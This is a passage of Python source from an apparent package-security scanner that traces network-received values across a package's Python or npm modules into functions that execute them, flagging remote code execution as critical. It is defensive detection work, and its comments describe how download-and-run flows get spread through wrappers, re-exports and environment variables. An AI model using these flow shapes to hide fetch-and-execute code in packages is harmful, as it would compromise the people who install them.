# The follower reads a package's own files (a Python top-level package, or an
# npm package) as modules: what each defines (functions, values, classes and
# their methods and attributes, static or not, and object literals, whose
# members are read like a class's static ones), imports (a name, a module, a
# default; import_module, __import__ and import() by a literal name, and
# require(path.join(__dirname, …))) and exports (npm: module.exports and its
# object literal, exports.x and exports['x'], export …, export default {…},
# the re-exports export … from, export * from, module.exports = require(…),
# and TypeScript's Object.defineProperty(exports, …) getters and
# exports.default), and the environment variables it sets. A symbol holds a
# received value when what it returns or is assigned carries a network
# source, or names a symbol that holds one — through a wrapper, a re-export,
# a class method (self.x / this.x), up to _XF_ROUNDS hops — or when its body
# receives one and hands it to a callback: a parameter it calls, or a
# Promise's resolve. A write into a module-level name (CACHE['c'] = …,
# cache.code = …) or an instance's own (self.data = …) is read like an
# assignment of it. Each module is then read by the single-file detector
# with the names that hold a received value in it seeded (extra_always): a
# function or value imported by name, a module's members (m.pull,
# pkg._net.pull), a class's static members (C.pull, api.pull) and an
# instance's (c = C(); c.pull(), self.c = C(); self.c.pull(), new ns.C(),
# C().pull() read as one name), and an environment variable another file set
# to a received value. The other way round, a function of the package that
# runs its parameter as code (def execute(c): exec(c)) is a runner in every
# file that imports it (extra_runners): the value is received there and run
# by the other file's function; (the detection round) so is a function that
# hands its parameter to a runner of the package (def go(c): execute(c)),
# up to _XF_ROUNDS hops.
# It fires only when the flow crosses files — a file whose own text shows it
# is the single-file test's — at the single-file severity (SC-IMPORT-RISK,
# CRITICAL for running what was received); comments and docstrings are read
# out first (a usage example is not code). Export detection is liberal (a
# function that fetches and returns is an export an HTTP library has too);
# the finding stays precise because it needs the value to be run.
# Bounded: _XF_MAX_FILES files and _XF_MAX_SYMBOLS symbols per package, a
# body read for _XF_WINDOW rows, an object literal for _XF_OBJECT_ROWS,
# _XF_MAX_SEEDS seeds per file, _XF_MAX_RUNNERS functions tested for running
# a parameter.
_XF_WINDOW = 25                 # rows of a function / method body read
_XF_MAX_FILES = 3000            # files per package the follower groups
_XF_MAX_SEEDS = 64              # cross-file seeds fed into one file
_XF_ROUNDS = 16                 # hops followed through wrappers, re-exports and runners
_XF_MAX_SYMBOLS = 5000          # symbols per package
_XF_MAX_DEPTH = 8               # re-exports followed to what they name
_XF_LOCAL_DEPTH = 3             # a body's locals followed to its return
_XF_OBJECT_ROWS = 400           # rows of an object literal read for its members
_XF_MAX_RUNNERS = 200           # functions per package tested for running a parameter
_XF_MAX_CHARS = 2_000_000       # a longer file (a bundle) is not read for what it defines

_XF_CLASS_RE = re.compile(r"^[ \t]*class[ \t]+(?P<name>[A-Za-z_]\w*)")
_XF_DEF_RE = re.compile(r"^[ \t]*(?:async[ \t]+)?def[ \t]+(?P<name>[A-Za-z_]\w*)[ \t]*\(")
_XF_ASSIGN_RE = re.compile(r"^(?P<indent>[ \t]*)(?P<name>[A-Za-z_]\w*)[ \t]*=(?![=])(?P<rhs>.*)$")
_XF_RETURN_RE = re.compile(r"^[ \t]*return[ \t](?P<expr>.*)$")
_XF_FROM_RE = re.compile(
    r"^[ \t]*from[ \t]+(?P<mod>\.+[\w.]*|[\w.]+)[ \t]+import[ \t]+(?P<names>\*|\([^()]*\)|.+?)[ \t]*$", re.M)
_XF_IMPORT_RE = re.compile(r"^[ \t]*import[ \t]+(?P<names>[\w.]+(?:[ \t]+as[ \t]+\w+)?(?:[ \t]*,[ \t]*[\w.]+"
                           r"(?:[ \t]+as[ \t]+\w+)?)*)[ \t]*$", re.M)
_XF_STATIC_RE = re.compile(r"^[ \t]*@(?:staticmethod|classmethod)\b")
_XF_DEF_END_RE = re.compile(r"\)[^():\n]*:")
_XF_PY_ENV_WRITE_RE = re.compile(
    r"\b(?:os[ \t]*\.[ \t]*)?environ[ \t]*\[[ \t]*['\"](?P<var>[A-Za-z_][A-Za-z0-9_]{0,63})['\"][ \t]*\][ \t]*=(?!=)"
    r"(?P<rhs>[^\n]*)")
_XF_PY_DYN_IMPORT_RE = re.compile(
    r"(?<![\w$.])(?P<local>[A-Za-z_]\w*)[ \t]*=[ \t]*(?:importlib[ \t]*\.[ \t]*)?(?P<fn>import_module|__import__)"
    r"[ \t]*\([ \t]*['\"](?P<mod>\.{0,8}[A-Za-z_][\w.]{0,200})['\"](?P<rest>[^\n]*)")
_XF_DEP_MARKERS = ("site-packages", "dist-packages", "vendor")
# a write into a name's member: CACHE['c'] = …, cache.code = …, self.data = …
_XF_MEMBER_WRITE_RE = re.compile(
    r"(?<![\w$.])(?P<name>[A-Za-z_$][\w$]*)[ \t]*(?:\[[^\]\n]*\]|\.[ \t]*(?P<attr>[A-Za-z_$][\w$]*))[ \t]*=(?![=>])"
    r"[ \t]*(?P<rhs>[^;\n]*)")
# a function's parameters, and a body handing what it receives to one (or to a Promise's resolve)
_XF_PARAMS_RE = re.compile(r"\((?P<params>[^()]*)\)")
_XF_PARAM_NAME_RE = re.compile(r"[ \t]*(?:\*{1,2}|\.\.\.)?[ \t]*(?P<name>[A-Za-z_$][\w$]*)")
_XF_ARROW_ONE_RE = re.compile(r"[ \t]*(?:async[ \t]+)?(?P<name>[A-Za-z_$][\w$]*)[ \t]*=>")
_XF_PROMISE_RE = re.compile(
    r"\bnew[ \t]+Promise[ \t]*\([ \t]*(?:async[ \t]+)?(?:function\b[^(\n]*\([ \t]*|\([ \t]*)?(?P<name>[A-Za-z_$][\w$]*)")
_XF_CALL_NAME_RE = re.compile(r"(?<![\w$.])(?P<name>[A-Za-z_$][\w$]*)[ \t]*\(")
_XF_NOT_PARAMS = frozenset({"self", "cls", "this", "async"})

_XF_JS_FUNC_RE = re.compile(r"\bfunction[ \t]*\*?[ \t]*(?P<name>[A-Za-z_$][\w$]*)[ \t]*\(")
_XF_JS_CONST_RE = re.compile(r"\b(?:const|let|var)[ \t]+(?P<name>[A-Za-z_$][\w$]*)[ \t]*=(?![=>])[ \t]*(?P<rhs>.*)$")
_XF_JS_FN_VALUE_RE = re.compile(r"(?:async[ \t]+)?(?:function\b[^(]*\(|\([^()]*\)[ \t]*=>|[A-Za-z_$][\w$]*[ \t]*=>)")
_XF_JS_CLASS_RE = re.compile(r"\bclass[ \t]+(?P<name>[A-Za-z_$][\w$]*)")
# a class method's header: `pull(args) {`, `static async pull(args) {`, `*g(){`, `get x() {`
_XF_JS_METHOD_RE = re.compile(
    r"(?:^|[ \t;{}])(?P<static>static[ \t]+)?(?:async[ \t]+)?(?:\*[ \t]*)?(?:(?:get|set)[ \t]+)?"
    r"(?P<name>[A-Za-z_$][\w$]*)[ \t]*\([^()]*\)[ \t]*\{")
# a class field, at the class body's own level: `static data = …`, `data = …`
_XF_JS_FIELD_RE = re.compile(r"^[ \t]*(?P<static>static[ \t]+)?(?P<name>[A-Za-z_$][\w$]*)[ \t]*=(?![=>])[ \t]*"
                             r"(?P<rhs>[^;\n]*)")
_XF_JS_KEYWORDS = frozenset({"if", "for", "while", "switch", "catch", "function", "return", "do", "else",
                             "with", "constructor", "class"})
_XF_JS_OBJECT_WORDS = ("const", "let", "var", "module", "export")      # what _XF_JS_OBJECT_RE needs
_XF_JS_RETURN_RE = re.compile(r"\breturn\b[ \t]*(?P<expr>[^;\n]*)")
_XF_JS_LOCAL_RE = re.compile(r"(?<![\w$.])(?:(?:const|let|var)[ \t]+)?(?P<name>[A-Za-z_$][\w$]*)[ \t]*=(?![=>])"
                             r"[ \t]*(?P<rhs>[^;\n]*)")
# an object literal whose members are read: const api = {…}, module.exports = {…}, export default {…}
_XF_JS_OBJECT_RE = re.compile(
    r"(?:\b(?:const|let|var)[ \t]+(?P<name>[A-Za-z_$][\w$]*)[ \t]*=|\bmodule[ \t]*\.[ \t]*exports[ \t]*="
    r"|\bexport[ \t]+default)[ \t]*\{")
_XF_JS_MEMBER_RE = re.compile(
    r"(?:async[ \t]+(?=[*A-Za-z_$'\"]))?(?:\*[ \t]*)?(?:(?:get|set)[ \t]+(?=[A-Za-z_$'\"]))?['\"]?"
    r"(?P<name>[A-Za-z_$][\w$]*)['\"]?[ \t]*(?:(?P<method>\()|(?P<colon>:)|(?=[,}]|$))")
_XF_JS_EXPORT_DECL_RE = re.compile(
    r"\bexport[ \t]+(?:async[ \t]+)?(?:function[ \t]*\*?[ \t]*|(?:const|let|var)[ \t]+|class[ \t]+)"
    r"(?P<name>[A-Za-z_$][\w$]*)")
_XF_JS_EXPORT_DEFAULT_DECL_RE = re.compile(
    r"\bexport[ \t]+default[ \t]+(?:async[ \t]+)?(?:function\b[ \t]*\*?[ \t]*(?P<fn>[A-Za-z_$][\w$]*)?"
    r"|class\b[ \t]*(?P<cls>[A-Za-z_$][\w$]*)?)")
_XF_JS_EXPORT_LIST_RE = re.compile(r"\bexport[ \t]*\{(?P<names>[^{}]*)\}(?![ \t]*from\b)")
_XF_JS_EXPORT_FROM_RE = re.compile(r"\bexport[ \t]*\{(?P<names>[^{}]*)\}[ \t]*from[ \t]*['\"](?P<mod>[^'\"\n]+)['\"]")
_XF_JS_EXPORT_STAR_RE = re.compile(
    r"\bexport[ \t]*\*[ \t]*(?:as[ \t]+(?P<ns>[A-Za-z_$][\w$]*)[ \t]*)?from[ \t]*['\"](?P<mod>[^'\"\n]+)['\"]")
_XF_JS_EXPORT_DEFAULT_RE = re.compile(r"\bexport[ \t]+default[ \t]+(?P<name>[A-Za-z_$][\w$]*)[ \t]*;?[ \t]*$", re.M)
_XF_JS_MODEXP_OBJ_RE = re.compile(r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*\{(?P<names>[^{}]*)\}")
_XF_JS_MODEXP_PROP_RE = re.compile(
    r"\b(?:module\s*\.\s*exports|exports)\s*(?:\.\s*(?P<name>[A-Za-z_$][\w$]*)|\[\s*['\"](?P<qname>[A-Za-z_$][\w$]*)"
    r"['\"]\s*\])[ \t]*=(?![=>])[ \t]*(?P<rhs>[^\n]*)")
_XF_JS_MODEXP_ALL_RE = re.compile(r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*(?P<name>[A-Za-z_$][\w$]*)[ \t]*;?[ \t]*$", re.M)
_XF_JS_MODEXP_CLASS_RE = re.compile(r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*class[ \t]+(?P<name>[A-Za-z_$][\w$]*)")
_XF_JS_MODEXP_REQ_RE = re.compile(r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*require\([ \t]*['\"](?P<mod>[^'\"\n]+)['\"][ \t]*\)")
_XF_JS_MODEXP_FN_RE = re.compile(
    r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*(?=(?:async[ \t]+)?(?:function\b|\([^()]*\)[ \t]*=>|[A-Za-z_$][\w$]*[ \t]*=>))")
_XF_JS_DEFINE_RE = re.compile(
    r"\bObject\s*\.\s*defineProperty\(\s*exports\s*,\s*['\"](?P<name>[A-Za-z_$][\w$]*)['\"]\s*,\s*\{[^{}]*?\bget\s*:"
    r"\s*function\s*\(\s*\)\s*\{\s*return\s+(?P<ref>[A-Za-z_$][\w$]*(?:\s*\.\s*[A-Za-z_$][\w$]*)*)")
_XF_JS_REQ_DESTR_RE = re.compile(
    r"\b(?:const|let|var)[ \t]*\{(?P<names>[^{}]*)\}[ \t]*=[ \t]*require\([ \t]*['\"](?P<mod>[^'\"\n]+)['\"][ \t]*\)")
# (TypeScript's and Babel's interop helpers wrap the require: __importDefault(require("./x")))
_XF_JS_REQ_NS_RE = re.compile(
    r"\b(?:const|let|var)[ \t]+(?P<ns>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*(?:(?:__importDefault|__importStar"
    r"|_interopRequireDefault|_interopRequireWildcard)[ \t]*\([ \t]*)?require\([ \t]*['\"](?P<mod>[^'\"\n]+)['\"]"
    r"[ \t]*\)(?![ \t]*\.)")
_XF_JS_REQ_MEMBER_RE = re.compile(
    r"\b(?:const|let|var)[ \t]+(?P<local>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*require\([ \t]*['\"](?P<mod>[^'\"\n]+)['\"][ \t]*\)"
    r"[ \t]*\.[ \t]*(?P<name>[A-Za-z_$][\w$]*)")
_XF_JS_IMP_NAMED_RE = re.compile(
    r"\bimport[ \t]*(?:[A-Za-z_$][\w$]*[ \t]*,[ \t]*)?\{(?P<names>[^{}]*)\}[ \t]*from[ \t]*['\"](?P<mod>[^'\"\n]+)['\"]")
_XF_JS_IMP_NS_RE = re.compile(
    r"\bimport[ \t]*\*[ \t]*as[ \t]+(?P<ns>[A-Za-z_$][\w$]*)[ \t]*from[ \t]*['\"](?P<mod>[^'\"\n]+)['\"]")
_XF_JS_IMP_DEFAULT_RE = re.compile(
    r"\bimport[ \t]+(?P<name>[A-Za-z_$][\w$]*)[ \t]*(?:,[ \t]*\{[^{}]*\})?[ \t]*from[ \t]*['\"](?P<mod>[^'\"\n]+)['\"]")
_XF_JS_DYN_DESTR_RE = re.compile(
    r"\b(?:const|let|var)[ \t]*\{(?P<names>[^{}]*)\}[ \t]*=[ \t]*(?:await[ \t]+)?import\([ \t]*['\"](?P<mod>[^'\"\n]+)['\"]"
    r"[ \t]*\)")
_XF_JS_DYN_NS_RE = re.compile(
    r"\b(?:const|let|var)[ \t]+(?P<ns>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*(?:await[ \t]+)?import\([ \t]*['\"](?P<mod>[^'\"\n]+)"
    r"['\"][ \t]*\)")
# a path built from the module's own directory: path.join(__dirname, 'x'), __dirname + '/x', `${__dirname}/x`
_XF_JS_DIRNAME_RE = re.compile(
    r"(?<![\w$])(?:path[ \t]*\.[ \t]*)?(?:join|resolve)[ \t]*\([ \t]*__dirname[ \t]*,[ \t]*['\"](?P<a>[^'\"\n]*)['\"][ \t]*\)"
    r"|(?<![\w$.])__dirname[ \t]*\+[ \t]*['\"](?P<b>/[^'\"\n]*)['\"]"
    r"|`\$\{__dirname\}(?P<c>/[^`$\n]*)`")
_XF_JS_ENV_WRITE_RE = re.compile(
    r"\bprocess\s*\.\s*env\s*(?:\.\s*(?P<a>[A-Za-z_$][\w$]*)|\[\s*['\"`](?P<b>[A-Za-z_$][\w$]*)['\"`]\s*\])\s*=(?![=>])"
    r"(?P<rhs>[^\n]*)")
_XF_SPACE_RE = re.compile(r"\s+")
_XF_BRACE_RE = re.compile(r"[{}]")
_XF_JS_LINE_COMMENT_RE = re.compile(r"(?:^|(?<=[\s;,(){}]))//")


_XF_PY_QUOTE_RE = re.compile(r"[#'\"]")
_XF_PY_BODY_RE = {q: re.compile(r"(?:[^\\" + q + r"]|\\.)*") for q in ("'", '"')}


def _xf_py_mask(text):
    """`text`'s rows with string contents blanked and comments cut, so a source
    call or a tainted name inside a string or comment is not read as code —
    including a triple-quoted docstring's usage example, which real network
    libraries carry (`requests.get(...)` in a docstring is not an export). A
    robustness heuristic, not a full tokenizer: escapes and string prefixes need
    not be exact, because over- or under-masking only shifts the (sink-gated)
    export approximation, never a finding on its own. Rows keep their length.
    (A row is searched from quote to quote: character by character, litellm's
    2,400 modules took 13 s.)"""
    out, delim = [], None
    for row in text.split("\n"):
        n = len(row)
        if delim is None and "#" not in row and "'" not in row and '"' not in row:
            out.append(row)
            continue
        parts, i = [], 0
        if delim is not None:                       # inside a triple-quoted string
            end = row.find(delim)
            if end < 0:
                out.append(" " * n)
                continue
            i = end + 3
            parts.append(" " * i)
            delim = None
        while i < n:
            m = _XF_PY_QUOTE_RE.search(row, i)
            if m is None:
                parts.append(row[i:])
                break
            j = m.start()
            parts.append(row[i:j])
            ch = row[j]
            if ch == "#":
                parts.append(" " * (n - j))
                break                               # comment to end of line
            three = row[j:j + 3]
            if three == "'''" or three == '"""':
                end = row.find(three, j + 3)
                if end < 0:
                    parts.append(" " * (n - j))
                    delim = three
                    break
                parts.append(" " * (end + 3 - j))
                i = end + 3
                continue
            k = _XF_PY_BODY_RE[ch].match(row, j + 1).end()     # to the closing quote, a backslash escaping
            if k < n and row[k] == ch:
                parts.append(ch + " " * (k - j - 1) + ch)
                i = k + 1
            else:                                   # unterminated: to the end of the row
                parts.append(ch + " " * (n - j - 1))
                break
        out.append("".join(parts))
    return out


def _xf_js_mask_line(row):
    """`row` with each string literal's contents blanked (quotes kept); its length stays."""
    return _DL_STR_RE.sub(lambda m: m.group()[0] + " " * (len(m.group()) - 2) + m.group()[-1]
                          if len(m.group()) >= 2 else m.group(), row)


def _xf_has_source(expr):
    return next(_dl_finditer(_DL_SOURCE, expr), None) is not None


def _xf_chains(expr):
    """The member chains named in `expr` (a, a.b.c), spaces taken out."""
    return {_XF_SPACE_RE.sub("", m.group()) for m in _DL_CHAIN_RE.finditer(expr)}


class _XfLocals:
    """{name: (source, refs)} of assignments [(name, rhs)], merged per name —
    each read only when _xf_follow reaches it (most locals never are)."""

    __slots__ = ("rhs", "done")

    def __init__(self, local_rows):
        self.rhs, self.done = {}, {}
        for name, rhs in local_rows:
            self.rhs.setdefault(name, []).append(rhs)

    def __contains__(self, name):
        return name in self.rhs

    def __getitem__(self, name):
        got = self.done.get(name)
        if got is None:
            source, refs = False, frozenset()
            for rhs in self.rhs[name]:
                source, refs = source or _xf_has_source(rhs), refs | _xf_chains(rhs)
            got = self.done[name] = (source, refs)
        return got


_xf_locals = _XfLocals


def _xf_follow(exprs, locals_):
    """(source, refs) of expressions, the local names they use followed to
    what those are assigned (_XF_LOCAL_DEPTH deep)."""
    source, refs = False, set()
    for expr in exprs:
        source = source or _xf_has_source(expr)
        refs |= _xf_chains(expr)
    frontier = {c.split(".")[0] for c in refs}
    seen = set(frontier)
    for _ in range(_XF_LOCAL_DEPTH):
        nxt = set()
        for name in frontier:
            if name in locals_:
                s, r = locals_[name]
                source = source or s
                refs |= r
                nxt |= {c.split(".")[0] for c in r} - seen
        seen |= nxt
        frontier = nxt
        if not frontier:
            break
    return source, frozenset(refs)


def _xf_delivers(body, params):
    """Does a body that receives a value hand it to a callback: a parameter
    it calls, or a Promise's resolve (https.get(u, (r) => … cb(data)))?"""
    joined = "\n".join(body)
    if not any(n in joined for n in _DL_NEEDLES):
        return False
    if not any(any(n in row for n in _DL_NEEDLES) and _xf_has_source(row) for row in body):
        return False
    names = set(params)
    for row in body:
        if "Promise" in row:
            names.update(m.group("name") for m in _XF_PROMISE_RE.finditer(row))
    names -= _XF_NOT_PARAMS
    return bool(names) and any(m.group("name") in names for row in body for m in _XF_CALL_NAME_RE.finditer(row))


def _xf_ret(returns, local_rows, body=(), params=()):
    """(source, refs) of a body: its return expressions, and the local names
    they use followed to what those are assigned; a body that hands what it
    receives to a callback holds a received value too (_xf_delivers)."""
    source, refs = _xf_follow(returns, _xf_locals(local_rows))
    if not source and body and _xf_delivers(body, params):
        source = True
    return source, refs


def _xf_params(row, at):
    """The parameter names of the function whose header starts at column
    `at` of `row`: its first (…) there, or an arrow's single name."""
    one = _XF_ARROW_ONE_RE.match(row, at)
    if one is not None:
        return [one.group("name")]
    i = row.find("(", at)
    m = _XF_PARAMS_RE.match(row, i) if i >= 0 else None
    if m is None:
        return []
    out = []
    for item in m.group("params").split(","):
        p = _XF_PARAM_NAME_RE.match(item)
        if p is not None:
            out.append(p.group("name"))
    return out


class _XfModule:
    """What the follower reads of one module (see the section comment)."""

    __slots__ = ("key", "lang", "path", "text", "defs", "classes", "imports", "exports", "reexports", "stars",
                 "default", "default_module", "env", "bodies", "relays")

    def __init__(self, key, lang, path, text):
        self.key, self.lang, self.path, self.text = key, lang, path, text
        self.defs = {}            # name -> (source, refs): functions and values
        self.classes = {}         # class or object literal -> {member: ((source, refs), static)}
        self.imports = {}         # local name -> (module key|None, imported name|None, kind, label)
        self.exports = {}         # npm: exported name -> local name, or ("ref", chain)
        self.reexports = {}       # npm: exported name -> (module key|None, name)
        self.stars = []           # npm: module keys of `export * from`
        self.default = None       # npm: the default export's local name, or "<default>"
        self.default_module = None   # npm: module.exports = require(…)'s module key
        self.env = {}             # environment variable -> (source, refs) of what it is set to
        self.bodies = {}          # symbol -> (parameters, body rows) of a function that names a code runner
        self.relays = {}          # symbol -> (parameters, body rows) of another function with parameters


def _xf_merge(old, new):
    return (old[0] or new[0], old[1] | new[1])


def _xf_member(mod, cls, name, ret, static):
    """Add (or merge into) member `name` of class or object literal `cls`."""
    meths = mod.classes.setdefault(cls, {})
    if name in meths:
        old, was_static = meths[name]
        meths[name] = (_xf_merge(old, ret), was_static)
    else:
        meths[name] = (ret, static)


def _xf_body(mod, sym, params, body):
    """Keep a function's body for the runner test when it names a code
    runner, else as a relay (it may hand a parameter to a runner)."""
    if params and sym not in mod.bodies:
        joined = "\n".join(body)
        if any(n in joined for n in _DL_RUN_NEEDLES):
            mod.bodies[sym] = (params, body)
        elif sym not in mod.relays:
            mod.relays[sym] = (params, body)


def _xf_writes(mod, masked, row_cls, lang):
    """Read the writes into a member of a module-level name (CACHE['c'] = …,
    cache.code = …, an object literal's api.x = …) and of an instance
    (self.data = … / this.data = … in a class's body) like assignments of
    it: what they assign, the file's assignments followed (_xf_follow)."""
    found = []
    for k, row in enumerate(masked):
        if "=" not in row or ("." not in row and "[" not in row) or len(row) > _DL_LONG_ROW:
            continue                                    # (a member write names a member: `.x` or `[…]`)
        for m in _XF_MEMBER_WRITE_RE.finditer(row):
            name, attr = m.group("name"), m.group("attr")
            if name in ("self", "this", "cls"):
                if attr is None or row_cls[k] is None:
                    continue
                found.append((("member", row_cls[k], attr), m.group("rhs")))
            elif attr is not None and name in mod.classes:
                found.append((("member", name, attr), m.group("rhs")))
            elif name in mod.defs:
                found.append((("def", name), m.group("rhs")))
    if not found:
        return
    pairs = []
    for row in masked:
        if "=" not in row or len(row) > _DL_LONG_ROW:
            continue
        if lang == "py":
            a = _XF_ASSIGN_RE.match(row)
            if a is not None:
                pairs.append((a.group("name"), a.group("rhs")))
        else:
            pairs.extend((m.group("name"), m.group("rhs")) for m in _XF_JS_LOCAL_RE.finditer(row))
    locals_ = _xf_locals(pairs)
    for target, rhs in found:
        ret = _xf_follow([rhs], locals_)
        if target[0] == "member":
            _xf_member(mod, target[1], target[2], ret, target[1] not in mod.defs and _xf_is_object(mod, target[1]))
        else:
            mod.defs[target[1]] = _xf_merge(mod.defs[target[1]], ret)


def _xf_is_object(mod, cls):
    """Is `cls` an object literal (its members are all static)?"""
    meths = mod.classes.get(cls, {})
    return bool(meths) and all(static for _ret, static in meths.values())


def _xf_py_parse(mod, pkg_parts):
    """Fill `mod` from its Python text (see the section comment)."""
    if len(mod.text) > _XF_MAX_CHARS:
        return
    code = mod.text
    masked = _xf_py_mask(code)
    n = len(masked)
    row_cls = [None] * n
    cls, cls_indent, body_indent, k = None, -1, -1, 0
    while k < n:
        row = masked[k]
        stripped = row.strip()
        if not stripped:
            k += 1
            continue
        indent = len(row) - len(row.lstrip())
        if cls is not None and indent <= cls_indent:
            cls = None
        if cls is not None and body_indent < 0:
            body_indent = indent                        # the class body's own level
        cm = _XF_CLASS_RE.match(row) if "class" in row else None
        if cm is not None:
            if indent == 0:
                cls, cls_indent, body_indent = cm.group("name"), indent, -1
                mod.classes.setdefault(cls, {})
            k += 1
            continue
        d = _XF_DEF_RE.match(row) if "def" in row else None
        if d is not None and (indent == 0 or (cls is not None and indent > cls_indent)):
            j = k + 1
            while j < n and j - k <= _XF_WINDOW:
                r = masked[j]
                if r.strip() and len(r) - len(r.lstrip()) <= indent:
                    break
                j += 1
            inline = _XF_DEF_END_RE.search(row, d.end())          # def f(x): return x
            body = ([row[inline.end():]] if inline is not None and row[inline.end():].strip() else []) + masked[k + 1:j]
            params = _xf_params(row, d.end() - 1)
            returns = [m.group("expr") for m in (_XF_RETURN_RE.match(r) for r in body if "return" in r) if m is not None]
            locals_ = [(a.group("name"), a.group("rhs")) for a in (_XF_ASSIGN_RE.match(r) for r in body if "=" in r)
                       if a is not None]
            ret = _xf_ret(returns, locals_, body, params)
            name = d.group("name")
            if cls is None:
                mod.defs.setdefault(name, ret)
                _xf_body(mod, name, params, body)
            else:
                static = k > 0 and _XF_STATIC_RE.match(masked[k - 1]) is not None
                _xf_member(mod, cls, name, ret, static)
                _xf_body(mod, cls + "." + name, params, body)
                for t in range(k, j):
                    row_cls[t] = cls
            k = j
            continue
        a = (_XF_ASSIGN_RE.match(row) if "=" in row and (indent == 0 or (cls is not None and indent == body_indent))
             else None)
        if a is not None and len(a.group("rhs")) <= _DL_LONG_ROW:
            ret = (_xf_has_source(a.group("rhs")), frozenset(_xf_chains(a.group("rhs"))))
            if indent == 0:
                mod.defs.setdefault(a.group("name"), ret)
            elif cls is not None and indent == body_indent:   # a class attribute: data = requests.get(…).text
                _xf_member(mod, cls, a.group("name"), ret, True)
        k += 1
    joined = "\n".join(masked)
    for m in _XF_FROM_RE.finditer(joined):
        target = _xf_resolve(m.group("mod"), pkg_parts)
        names = m.group("names").strip()
        if names == "*":
            mod.imports.setdefault("*" + (target or ""), (target, "*", "star", target))
            continue
        for item in names.strip("()").split(","):
            parts = item.split()
            if not parts:
                continue
            local = parts[2] if len(parts) == 3 and parts[1] == "as" else parts[0]
            mod.imports[local] = (target, parts[0], "name", target)
    for m in _XF_IMPORT_RE.finditer(joined):
        for item in m.group("names").split(","):
            parts = item.split()
            if not parts:
                continue
            local = parts[2] if len(parts) == 3 and parts[1] == "as" else parts[0]
            mod.imports[local] = (parts[0], None, "module", parts[0])
    code_rows = code.split("\n")
    if "import_module" in code or "__import__" in code:
        for k, row in enumerate(code_rows):
            if "import" not in row or len(row) > _DL_LONG_ROW:
                continue
            for m in _XF_PY_DYN_IMPORT_RE.finditer(row):
                if masked[k][m.start():m.start() + 1] != row[m.start()]:
                    continue                            # in a comment or a docstring
                target = _xf_resolve(m.group("mod"), pkg_parts)
                if target is None:
                    continue
                local = m.group("local")
                parts = target.split(".")
                if m.group("fn") == "__import__" and "fromlist" not in m.group("rest") and len(parts) > 1:
                    # __import__('a.b') is the top package a; a.b is a member of it
                    mod.imports[local] = (parts[0], None, "module", parts[0])
                    for i in range(2, len(parts) + 1):
                        sub = ".".join(parts[:i])
                        mod.imports[local + sub[len(parts[0]):]] = (sub, None, "module", sub)
                else:
                    mod.imports[local] = (target, None, "module", target)
    for k, row in enumerate(code_rows):
        if "environ" not in row or len(row) > _DL_LONG_ROW:
            continue
        for m in _XF_PY_ENV_WRITE_RE.finditer(row):
            if masked[k][m.start():m.start() + 1] != row[m.start()]:
                continue                                # in a comment or a docstring
            rhs = masked[k][m.start("rhs"):m.end("rhs")]
            old = mod.env.get(m.group("var"), (False, frozenset()))
            mod.env[m.group("var")] = (old[0] or _xf_has_source(rhs), old[1] | _xf_chains(rhs))
    _xf_writes(mod, masked, row_cls, "py")


def _xf_js_body(masked, k, at):
    """(rows, end): the rows of the brace body that starts at the first '{'
    at or after column `at` of row k, up to its closing '}' (or
    _XF_WINDOW rows), the first cut at that '{'; ([], k) when there is none."""
    first = masked[k].find("{", at)
    if first < 0:
        return [], k
    rows, depth = [], 0
    for j in range(k, min(len(masked), k + _XF_WINDOW + 1)):
        row = masked[j][first:] if j == k else masked[j]
        cut = None
        for b in _XF_BRACE_RE.finditer(row):
            depth += 1 if b.group() == "{" else -1
            if depth == 0:
                cut = b.end()
                break
        rows.append(row if cut is None else row[:cut])
        if cut is not None:
            return rows, j
    return rows, min(len(masked), k + _XF_WINDOW + 1) - 1


def _xf_js_ret(rows, params=()):
    returns = [m.group("expr") for row in rows for m in _XF_JS_RETURN_RE.finditer(row)]
    locals_ = [(m.group("name"), m.group("rhs")) for row in rows for m in _XF_JS_LOCAL_RE.finditer(row)]
    return _xf_ret(returns, locals_, rows, params)


def _xf_js_fn(masked, k, at):
    """((source, refs), params, body rows) of the function whose header
    starts at column `at` of row k: its brace body, or an arrow's expression."""
    row = masked[k]
    params = _xf_params(row, at)
    arrow = row.find("=>", at)
    brace = row.find("{", at)
    if arrow >= 0 and (brace < 0 or arrow < brace):
        rest = row[arrow + 2:].lstrip()
        if not rest.startswith("{"):
            return _xf_ret([rest], [], [rest], params), params, [rest]
        body, _end = _xf_js_body(masked, k, arrow)
        return _xf_js_ret(body, params), params, body
    body, _end = _xf_js_body(masked, k, at)
    return _xf_js_ret(body, params), params, body


def _xf_js_destr(names):
    """[(export/property name, local name)] for a `{ a, b as c, d: e, 'f': g }` list."""
    out = []
    for item in names.split(","):
        parts = [p.strip("'\"`") for p in item.replace(":", " ").replace(" as ", " ").split()]
        parts = [p for p in parts if p]
        if len(parts) == 1:
            out.append((parts[0], parts[0]))
        elif len(parts) >= 2:
            out.append((parts[0], parts[1]))
    return out


def _xf_js_row_classes(rows):
    """For each masked row, the name of the class whose body encloses it (or
    None), and how deep in that body the row starts (1: the class body's own
    level) — a brace-depth pass pairing `class NAME … {` with its `}`."""
    row_class, row_level = [None] * len(rows), [0] * len(rows)
    depth, stack, pending = 0, [], None         # stack entries: (class name, body depth)
    for k, row in enumerate(rows):
        if stack:
            row_class[k], row_level[k] = stack[-1][0], depth - stack[-1][1]
        if "{" not in row and "}" not in row and "class" not in row:
            continue
        events = [(m.start(), "c", m.group("name")) for m in _XF_JS_CLASS_RE.finditer(row)]
        events += [(m.start(), m.group(), None) for m in _XF_BRACE_RE.finditer(row)]
        events.sort()
        for _pos, kind, name in events:
            if kind == "c":
                pending = name
            elif kind == "{":
                if pending is not None:
                    stack.append((pending, depth))
                    pending = None
                depth += 1
            else:
                depth -= 1
                if stack and stack[-1][1] == depth:
                    stack.pop()
    return row_class, row_level


def _xf_js_key(rel, spec):
    """The module key a relative import `spec` of the file `rel` names, else
    None (a bare name is another package); '.' and '..' name an index."""
    if not spec.startswith("."):
        return None
    key = _xf_js_norm(posixpath.normpath(posixpath.join(posixpath.dirname(rel), spec)))
    return "index" if key == "." else key


def _xf_js_views(text):
    """(code rows, masked rows) of a JavaScript text: comments blanked, and
    in the masked rows string contents too; rows keep their length, and a
